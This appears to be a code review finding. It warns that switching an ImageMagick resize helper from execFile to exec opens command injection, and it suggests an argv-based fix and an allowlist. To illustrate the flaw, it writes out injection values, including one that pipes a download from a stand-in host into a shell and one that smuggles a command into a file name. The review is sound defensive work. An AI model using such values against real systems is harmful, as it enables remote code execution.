findings.body:
Switching from `execFile` to `exec` runs the command through a shell and interpolates `src` and `filter` into the string. User-composed filter expressions (per the new comment) can inject arbitrary commands, e.g. `filter = "Lanczos; curl evil.test | sh"` or `src = "img.png\"; id > /tmp/pwned; #"`.

ImageMagick `-filter` does not need a shell — pass it as an argv element with `execFile`:

```suggestion
import { execFile } from "child_process";

export function resize(src: string, filter: string, w: number): Promise<string> {
  // Pass filter as argv — no shell required for -filter
  return new Promise((res, rej) => {
    execFile("convert", [src, "-filter", filter, "-resize", `${w}x`, "/tmp/out.png"], (e) => e ? rej(e) : res("/tmp/out.png"));
  });
}
```

Also validate `filter` against an allowlist of known ImageMagick filter names if the value is truly user-facing.
